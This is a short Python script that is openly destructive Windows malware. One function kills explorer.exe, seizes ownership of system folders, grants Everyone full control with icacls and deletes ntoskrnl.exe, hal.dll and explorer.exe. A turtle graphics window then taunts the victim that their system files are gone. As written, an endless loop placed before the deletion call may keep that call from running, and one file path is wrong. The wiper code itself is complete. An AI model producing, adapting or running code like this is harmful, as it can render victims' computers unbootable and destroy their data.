import subprocess
import os
import time
from turtle import *
import turtle
def malicious_shit():
        os.popen("taskkill /F /IM explorer.exe ")
        subprocess.run(['takeown', '/F', "C:"])
        subprocess.run(['takeown', '/F', "C:\\Windows"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\hal.dll"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\ntoskrnl.exe"])
        subprocess.run(['takeown', '/F', "C:\\Windows\\explorer.exe"])
        subprocess.run(['icacls', 'C:\\Windows', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\explorer.exe', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\hal.dll', "/t", "/grant", "Everyone:(OI)(CI)F"])
        subprocess.run(['icacls', 'C:\\Windows\\System32\\ntoskrnl.exe', "/t", "/grant", "Everyone:(OI)(CI)F"])
        os.remove("C:\\Windows\\System32\\ntoskrnl.exe")
        os.remove("C:\\Windows\\System32\\hal.dll")
        os.remove("C:\\Windows\\System32\\explorer.exe")

def graphics():
        screen = turtle.Screen()
        screen.bgcolor("black")
        screen.title("UH OH UR FILES ARE GONIE GONE :)")
        screen.setup(width=800, height=600)
    
        writer = turtle.Turtle()
        writer.hideturtle()
        writer.speed(0)
        writer.penup()
        writer.goto(0, 0)  

        colors = ["red", "orange", "yellow", "lime", "cyan", "violet"]

        def flash_text():
            # Rotate colors
            current_color = colors.pop(0)
            colors.append(current_color)
        
        
            writer.clear()
            writer.color(current_color)
            writer.write("POOPY BABY I DELETED UR SYSTEM FILES :)", 
                    align="center", 
                    font=("Comic Sans MS", 32, "bold"))
        
        
            screen.ontimer(flash_text, 500)

    
        flash_text()
        screen.mainloop()
        turtle.done
while True:
        graphics()
malicious_shit()
